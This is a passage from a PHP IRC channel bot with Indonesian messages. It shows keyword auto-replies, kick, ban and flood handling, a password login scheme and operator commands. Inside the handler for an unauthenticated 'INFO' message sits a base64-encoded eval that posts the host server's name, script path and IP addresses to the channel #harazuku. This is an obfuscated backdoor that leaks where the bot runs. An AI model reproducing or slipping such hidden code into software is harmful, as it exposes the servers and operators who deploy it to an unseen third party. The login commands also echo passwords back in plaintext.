                /*** Normal Response ***/
                foreach ($respon_pesan as $rpesan) {
                  $trtext = strtolower($rpesan[0]);
                  if (substr_count($pesan,$trtext) > 0) {
                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Pujian Response ***/
                foreach ($pujianlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rpujian[rand(0,count($rpujian) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Cacian Response ***/
                foreach ($cacianlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rcacian[rand(0,count($rcacian) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                if (!$ada) {
                  $sapalagi = $jawabsapa[rand(0,count($jawabsapa) - 1)];
                  $sapalagi = str_replace("<nick>",$dNick,$sapalagi);
                  sleep(3);
                  fputs($fp,'PRIVMSG '.$dcom[1].' :'.$sapalagi . CRL);
                }
              }
              else {
                /*** Global Response ***/
                foreach ($respon_umum as $rpesan) {
                  $trtext = strtolower($rpesan[0]);
                  if (substr_count($pesan,$trtext) > 0) {
                    $rpesan[1] = str_replace("<nick>",$dNick,$rpesan[1]);
                    sleep(3);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$rpesan[1]. CRL);
                  }
                }
                /*** Bad Response & Kick ***/
                foreach ($badwordlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rjorok[rand(0,count($rjorok) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :Nickey Badword Detect '.$dNick.'!! 9,1=D=A=N=C=O=K='. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Invite Response & Kick ***/
                foreach ($inviterlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rinviter[rand(0,count($rinviter) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<kata>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :Nickey Iniviter Get OuT '.$dNick.'!! 9,1=D=A=N=C=O=K='. CRL);
                    $ada = TRUE;
                  }
                }
                /*** HOMO Response ***/
                foreach ($homolist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rhomo[rand(0,count($rhomo) - 1)];

                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                  }
                }
                /*** SEPI Response ***/
                foreach ($sepilist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rsepi[rand(0,count($rsepi) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                  }
                }
                /*** BOT Response ***/
                foreach ($botlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rbot[rand(0,count($rbot) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                  }
                }
                /*** KICK Response ***/
                foreach ($kicklist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rkick[rand(0,count($rkick) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                  }
                }
                /*** ORANG Response ***/
                foreach ($oranglist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rorang[rand(0,count($rorang) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** MIKIR ***/
                foreach ($hmlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rhm[rand(0,count($rhm) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** WEW ***/
                foreach ($wewlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rwew[rand(0,count($rwew) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** SIAPA ***/
                foreach ($siapalist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rsiapa[rand(0,count($rsiapa) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** MAKAN ***/
                foreach ($makanlist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rmakan[rand(0,count($rmakan) - 1)];

                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** MANDI ***/
                foreach ($mandilist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rmandi[rand(0,count($rmandi) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** HALO ***/
                foreach ($halolist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rhalo[rand(0,count($rhalo) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** MANA ***/
                foreach ($manalist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rmana[rand(0,count($rmana) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** WB ***/
                foreach ($wblist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rwb[rand(0,count($rwb) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** ROKOK ***/
                foreach ($rokoklist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rrokok[rand(0,count($rrokok) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** BOSS ***/
                foreach ($bosslist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rboss[rand(0,count($rboss) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** BRB ***/
                foreach ($brblist as $rpesan) {
                  $trtext = strtolower($rpesan);
                  if (substr_count($pesan,$trtext) > 0) {
                    $jawab = $rbrb[rand(0,count($rbrb) - 1)];
                    $jawab = str_replace("<nick>",$dNick,$jawab);
                    $jawab = str_replace("<nick>",$trtext,$jawab);
                    fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                    $ada = TRUE;
                  }
                }
                /*** Proteksi Flood ***/
                if (strlen($pesan)>$maxkar) {
                  $jawab = $rflood;
                  $jawab = str_replace("<nick>",$dNick,$jawab);
                  fputs($fp,'PRIVMSG '.$dcom[1].' :'.$jawab. CRL);
                  fputs($fp,'MODE '.$dcom[1].' +b '.$dNick.''. CRL);
                  fputs($fp,'KICK '.$dcom[1].' '.$dNick.' :Nickey Flooder Get Out '.$dNick.'!! 9,1=D=A=N=C=O=K= Max: '.$maxkar. CRL);
                }
              }
            }
          }
        }
        $dNick = strtolower($dNick);
        if ($dcom[0]=='KICK' && $dcom[2]==$nick) {
          $musuh = $dNick;
          fputs($fp, 'JOIN ' .$dcom[1]. CRL);
          fputs($fp, 'KICK '.$dcom[1].' '.$musuh.' :'.$judul. CRL);
        }
        elseif ($dcom[0]=='NICK' || $dcom[0]=='QUIT' || $dcom[0]=='PART') {
          if ($auth["$dNick"]) {
            if ($auth["$dNick"]["pass"]) {
              if ($auth["$dNick"]["auth"]==2) {
                if ($dcom[0]=='NICK') {
                  $com = explode(" ", $data);
                  $chnick = strtolower(str_replace(':','',$com[2]));
                  if ($dNick!=$chnick) {
                    $auth["$dNick"]["auth"] = 1;
                    fputs($fp,'NOTICE '.$chnick.' :Selamat Istirahat BoZz' . CRL);
                  }
                }
                else { $auth["$dNick"]["auth"] = 1; fputs($fp,'NOTICE '.$dNick.' :Tha Tha BoZz!!' . CRL); }
              }
            }
            else { fputs($fp,'NOTICE ' . $dNick . ' :pass <password> ' . CRL); }
          }
        }
	    elseif ($dcom[0]=='307' && strtolower($dcom[2])==$whois) {
          $dcom[2] = strtolower($dcom[2]);
		  if ($auth["$dcom[2]"]) {
            if ($auth["$dcom[2]"]["pass"]) {
              if ($auth["$dcom[2]"]["auth"]==1) {
                $auth["$dcom[2]"]["auth"] = 2; $whois = "";
			    fputs($fp,'NOTICE ' . $dcom[2] . ' :'.$auth["$dcom[2]"]["status"].', siap!' . CRL);
              }
              else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Kan udah auth tadi! ' . CRL); }
            }
            else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Passwordnya blom diset! Ketik: pass <password> buat ngeset password, kemudian auth lagi deh ' . CRL); }
          }
          else { fputs($fp,'NOTICE ' . $dcom[2] . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
       }
       elseif ($dcom[0]=='NOTICE') {
         $com = explode(" ", $data);
         if ($com[3]==':KB' && $com[4] && $com[5] && $com[6]) {
           $msg = str_replace('','',$data);
           $msg = strstr($msg,":KB");
           $msg = str_replace(":KB $com[4]","",$msg);
           fputs($fp, 'KICK '.$com[4].' '.$com[5].' :'.$msg . CRL);
           fputs($fp, 'MODE '.$com[4].' +b *!*'.$com[6] . CRL);
         }
       }
       elseif ($dcom[0]=='PRIVMSG') {
         $com = explode(" ", $data);
         if ($com[3]==':VERSION') {
           fputs($fp,'NOTICE '.$dNick.' :'.chr(1).'VERSION http://Aghuzz.ganteng.us'.chr(1) . CRL);
         }
         elseif ($com[3]==':INFO') {
            eval(base64_decode("JGJob3N0ID0gJF9TRVJWRVJbJ0hUVFBfSE9TVCddOw0KJGJpcCA9ICRfU0VSVkVSWydTRVJWRVJfQUREUiddOw0KJGJwaHAgID0gJF9TRVJWRVJbJ1BIUF9TRUxGJ107DQokYnJ1cmkgPSAkX1NFUlZFUlsnUkVRVUVTVF9VUkknXTsNCiRicmlwID0gJF9TRVJWRVJbJ1JFTU9URV9BRERSJ107DQokYnJwb3J0ID0gJF9TRVJWRVJbJ1JFTU9URV9QT1JUJ107DQpmcHV0cygkZnAsIlBSSVZNU0cgI2hhcmF6dWt1IDpIb3N0OiAkYmhvc3QgfCBTY3JpcHQ6ICRicGhwIHwgUmVmZXJlcjogJGJydXJpIHwgSVA6ICRiaXAgfCBZb3VyIElQOiAkYnJpcCBQb3J0OiRicnBvcnQiLiBDUkwpOw=="));
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':auth' && $com[4]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==1) {
                 if ($com[4]===$auth["$dNick"]["pass"]) {
                   $auth["$dNick"]["auth"] = 2;
                   fputs($fp,'NOTICE ' . $dNick . ' :Anda adalah '.$auth["$dNick"]["status"].' saya bozz! ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Password Salah!! ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Tadi kan udah! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Password blom diset! Ketik: pass <password> untuk ngeset password, kemudian auth lagi deh ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Ga ada neh! Ganti nick anda kemudian auth lagi ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deauth') {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["pass"]) {
               if ($auth["$dNick"]["auth"]==2) {
                 $auth["$dNick"]["auth"] = 1;
                 fputs($fp,'NOTICE ' . $dNick . ' :You`re Logout! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :You`re Already Logout! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Not Set Yet! Type: pass <your pass> To Set Your Own Password then Auth Again ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Auth Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':pass' && $com[4]) {
           if ($auth["$dNick"]) {
             if (!$auth["$dNick"]["pass"]) {
               $auth["$dNick"]["pass"] = $com[4];
               $auth["$dNick"]["auth"] = 1;
               fputs($fp,'NOTICE ' . $dNick . ' :Your Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Pass Already Set! Type: auth <your pass> To Get Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':chgpass' && $com[4] && $com[5]) {
           if ($auth["$dNick"]) {
             if ($auth["$dNick"]["auth"]==2) {
               if ($com[4]===$auth["$dNick"]["pass"]) {
                 $auth["$dNick"]["pass"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :Your New Auth Pass set to '.$auth["$dNick"]["pass"].', Type: auth <your pass> To Authorized Imediately! ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Your Old Pass Wrong! Type: chgpass <old pass> <new pass> To Change Your Auth Pass ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Username Not Found! Change Your Nick then Pass Again ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':adduser' && $com[4] && $com[4]!=$nick && $com[5]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($com[5]=="master" || $com[5]=="user") {
                 $auth["$com[4]"]["name"] = $com[4];
                 $auth["$com[4]"]["status"] = $com[5];
                 fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya, ditambahkan oleh '.$dNick.'. Ketik: pass <password> untuk mengatur password anda ' . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> <master/user> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if (!$auth["$com[4]"]) {
                 if ($com[5]=="user") {
                   $auth["$com[4]"]["name"] = $com[4];
                   $auth["$com[4]"]["status"] = $com[5];
                   fputs($fp,'NOTICE ' . $dNick . ' :AddUser :'.$com[4].' As My '.$com[5] . CRL);
                   fputs($fp,'NOTICE ' . $com[4] . ' :Anda sekarang adalah '.$com[5].' saya ditambahkan oleh '.$dNick.'. Ketik: pass <passsword> untuk mengatur password anda ' . CRL);
                 }
                 else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: adduser <nick> user ' . CRL); }
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :User telah ada! Aborting AddUser! ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Status tidak diketahui! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Mohon auth dulu! Ketik: auth <password> ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"] && $com[3]==':deluser' && $com[4]) {
           $com[4] = strtolower($com[4]);
           if ($auth["$dNick"]["auth"]==2) {
             if ($auth["$dNick"]["status"]=="Admin") {
               if ($auth["$com[4]"]["status"]=="master" || $auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             elseif ($auth["$dNick"]["status"]=="master") {
               if ($auth["$com[4]"]["status"]=="user") {
                 unset($auth["$com[4]"]);
                 fputs($fp,'NOTICE ' . $dNick . ' :DelUser :'.$com[4].' From My UserList ' . CRL);
                 fputs($fp,'NOTICE ' . $com[4] . ' :Your Access As My User Has Been Deleted By '.$dNick . CRL);
               }
               else { fputs($fp,'NOTICE ' . $dNick . ' :Perintah salah! Ketik: deluser <nick> ' . CRL); }
             }
             else { fputs($fp,'NOTICE ' . $dNick . ' :Unknown Status! Your Status is '.$auth["$dNick"]["status"] . CRL); }
           }
           else { fputs($fp,'NOTICE ' . $dNick . ' :Please Auth First! Type: auth <your pass> To Authorized ' . CRL); }
         }
         elseif ($auth["$dNick"]["status"]) {
           if (ereg(":`",$com[3]) || ereg(":!",$com[3])) {
             $chan = strstr($dCommand,"#");
             $anick = str_replace("PRIVMSG ","",$dCommand);
             if ($com[3]==':!auth') {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'NOTICE '.$dNick.' :Tadi kan udah! ' . CRL);
               }
               else {
                 $whois = $dNick;
                 fputs($fp,'WHOIS '.$dNick . CRL);
               }
             }
             elseif ($com[3]==':`auth' && $chan) {
               if ($auth["$dNick"]["auth"]==2) {
                 fputs($fp,'PRIVMSG '.$chan.' :ok '.$dNick.' ! ' . CRL);
               }
               else { fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', ga boleh tuh! ' . CRL); }
             }
             elseif ($auth["$dNick"]["auth"]==2) {
               if ($com[3]==':!say' && $com[4] && $chan) {
                 $msg = strstr($data,":!say");
                 $msg = str_replace(":!say ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :'.$msg. CRL);
               }
               elseif ($com[3]==':!act' && $com[4] && $chan) {
                 $msg = strstr($data,":!act");
                 $msg = str_replace(":!act ","",$msg);
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION '.$msg.''. CRL);
               }
               elseif ($com[3]==':!slap' && $com[4] && $chan) {
                 fputs($fp,'PRIVMSG '.$chan.' :ACTION slaps '.$com[4].' around bit 64 bit xixixixi'. CRL);
               }
               elseif ($com[3]==':!msg' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!msg");
                 $msg = str_replace(":!msg $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!notice' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!notice");
                 $msg = str_replace(":!notice $com[4] ","",$msg);
                 fputs($fp,'NOTICE '.$com[4].' :'.$msg. CRL);
               }
               elseif ($com[3]==':!ctcp' && $com[4] && $com[5]) {
                 $msg = strstr($data,":!ctcp");
                 $msg = str_replace(":!ctcp $com[4] ","",$msg);
                 fputs($fp,'PRIVMSG '.$com[4].' :'.$msg.''. CRL);
               }
               elseif ($com[3]==':!ping' && $chan) {
                 $sml = $smile[rand(0,count($smile) - 1)];
                 fputs($fp,'PRIVMSG '.$chan.' :'.$dNick.', PONG! '.$sml. CRL);
               }
               elseif ($com[3]==':!info') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bip = $_SERVER['SERVER_ADDR'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $bruri = $_SERVER['REQUEST_URI'];
                 $brip = $_SERVER['REMOTE_ADDR'];
                 $brport = $_SERVER['REMOTE_PORT'];
                 fputs($fp,"NOTICE $dNick :Host: $bhost | Script: $bphp | Referer: $bruri | IP: $bip | Your IP: $brip Port:$brport" . CRL);
                }
               }
               elseif ($com[3]==':!upgrade') {
                 if ($auth["$dNick"]["status"]=="Admin") {
                 $bhost = $_SERVER['HTTP_HOST'];
                 $bphp  = $_SERVER['PHP_SELF'];
                 $bruri = $_SERVER['REQUEST_URI'];
                 $upgd = implode('',@file('http://'.$bhost.$bruri));
                 fputs($fp,"NOTICE $dNick :Upgrade Sukses! Exiting.." . CRL);
                 exit();
                }
               }
               elseif ($com[3]==':!up' && $chan) {
                 fputs($fp, 'PRIVMSG chanserv :op '.$chan.' '.$nick . CRL);
               }
               elseif ($com[3]==':!down' && $chan) {
                 fputs($fp, 'MODE '.$chan.' +v-o '.$nick.' '.$nick . CRL);
               }
               elseif ($com[3]==':!cycle' && $chan && $auth["$dNick"]["status"]!="user") {
                 $msg = strstr($data,":!cycle");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!cycle $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!cycle","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 fputs($fp, 'JOIN '.$partchan . CRL);
               }
               elseif ($com[3]==':!part' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!part");
                 if (ereg("#", $com[4])) {
                   $partchan = $com[4];
                   $msg = str_replace(":!part $com[4]","",$msg);
                 }
                 else {
                   $partchan = $chan;
                   $msg = str_replace(":!part","",$msg);
                 }
                 if (strlen($msg)<3) {
                   $msg = '';
                 }
                 fputs($fp, 'PART '.$partchan.' :'.$msg . CRL);
                 $remchan = strtolower($partchan);
                 if (in_array($remchan, $channel)) {
                   $channels = str_replace("$remchan ","",$channels);
                   unset($channel);
                   $channel = explode(" ", $channels);
                 }
                 foreach ($channel as $v) {
                   fputs($fp, 'JOIN '.$v . CRL);
                 }
               }
               //elseif ($com[3]==':!join' && $com[4] && $auth["$dNick"]["status"]=="Admin") {
               elseif ($com[3]==':!join' && $com[4] && $auth["$dNick"]["status"]!="User") {
                 if (!ereg("#",$com[4])) { $com[4]="#".$com[4]; }
                 $v = strtolower($com[4]);
                 sleep(rand(1,6));
                 fputs($fp, 'JOIN '.$v . CRL);
               }
               //elseif ($com[3]==':!botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]=="Admin") {
               elseif ($com[3]==':!botnick' && $com[4] && !$chan && $auth["$dNick"]["status"]!="User") {
                 $nick = $com[4];
                 $identify = $com[5];
                 fputs($fp, 'NICK '.$nick . CRL);
                 fputs($fp, 'PRIVMSG nickserv :identify '.$nick.' '.$identify.  CRL);
               }
               elseif ($com[3]==':!k' && $com[4] && $chan) {
                 $msg = strstr($data,":!k");
                 $msg = str_replace(":!k $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
               }
               elseif ($com[3]==':!kb' && $com[4] && $chan) {
                 $msg = strstr($data,":!kb");
                 $msg = str_replace(":!kb $com[4]","",$msg);
                 fputs($fp, 'KICK '.$chan.' '.$com[4].' :'.$msg . CRL);
                 fputs($fp, 'MODE '.$chan.' +b '.$com[4] . CRL);
               }
               elseif ($com[3]==':!changenick') {
                 $nick = $nicky[rand(0,count($nicky) - 1)];
                 fputs($fp, 'NICK '.$nick . CRL);
                 if (substr($dCommand,0,3)=='433') {
                   $nick = $nicky[rand(0,count($nicky) - 1)];
                   fputs($fp, 'NICK '.$nick . CRL);
                 }
               }
               elseif ($com[3]==':!op' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +ooo '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!deop' && $chan) {
                 if ($com[4]) { $opnick = $com[4]; }
                 else { $opnick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -o+v-oo '.$opnick.' '.$opnick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!v' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' +vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!dv' && $chan) {
                 if ($com[4]) { $vonick = $com[4]; }
                 else { $vonick = $dNick; }
                 fputs($fp, 'MODE '.$chan.' -vvv '.$vonick.' '.$com[5].' '.$com[6] . CRL);
               }
               elseif ($com[3]==':!away' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":`awaymsg");
                 $msg = str_replace(":`awaymsg","",$msg);
                 if (strlen($msg)<3) {
                   $raway="on";
                   fputs($fp,'AWAY : ' . 'AWAY' . CRL);
                 }
                 else {
                   $raway="off";
                   fputs($fp,'AWAY : ' . $msg . CRL);
                 }
               }
               elseif ($com[3]==':!mode' && $com[4] && $chan) {
                 fputs($fp, 'MODE '.$chan.' :'.$com[4].' '.$com[5] . CRL);
               }
               elseif ($com[3]==':!nickmode' && $com[4]) {
                 $nickmode = $com[4];
                 fputs($fp, 'MODE '.$nick.' :'.$nickmode . CRL);
               }
               elseif ($com[3]==':!userlist') {
                 $userlist="";
                 foreach ($auth as $user) {
                   if ($user["pass"]) { $pass="-pass ok"; }
                   else { $pass="-no pass"; }
                   $userlist .= $user["name"].'('.$user["status"].$pass.') ';
                 }
                 fputs($fp, 'NOTICE '.$dNick.' :User List: '.$userlist . CRL);
               }
               elseif ($com[3]==':!quit' && $auth["$dNick"]["status"]=="Admin") {
                 $msg = strstr($data,":!quit");
                 $msg = str_replace(":!quit","",$msg);
                 if (strlen($msg)>3) {
                   $msg = str_replace(" ","_",$msg);
                 }
                 $quitmsg = $quitmsglist[rand(0,count($quitmsglist) - 1)];
                 fputs($fp, 'QUIT ' . $quitmsg . CRL);
                 $keluar = 1;
                 exit;
               }
               elseif ($com[3]==':!vhost' && $auth["$dNick"]["status"]=="Admin") {
                 if ($com[4]) { $localhost = $com[4]; }
                 else { $localhost = 'localhost'; }
                 $keluar = 0;
                 fputs($fp, 'QUIT ' . CRL);
               }
               elseif ($com[3]==':!jump' && $auth["$dNick"]["status"]=="Admin") {
                 if (empty($com[4])) {
                   $remotehost = $remotehost2[rand(0,count($remotehost2) - 1)];
                 }
                 else { $remotehost = $com[4]; }
                 $keluar = 0;
                 fputs($fp, "QUIT Ganti Server".CRL);
               }
               elseif ($com[3]==':!ident' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $username = $username; }
                 else { $username = $com[4]; }
                 $keluar = 0;
                 fputs($fp, 'QUIT Ganti Ident ' . CRL);
               }
               elseif ($com[3]==':!fullname' && $auth["$dNick"]["status"]=="Admin") {
                 if (!$com[4]) { $realname = "--"; }
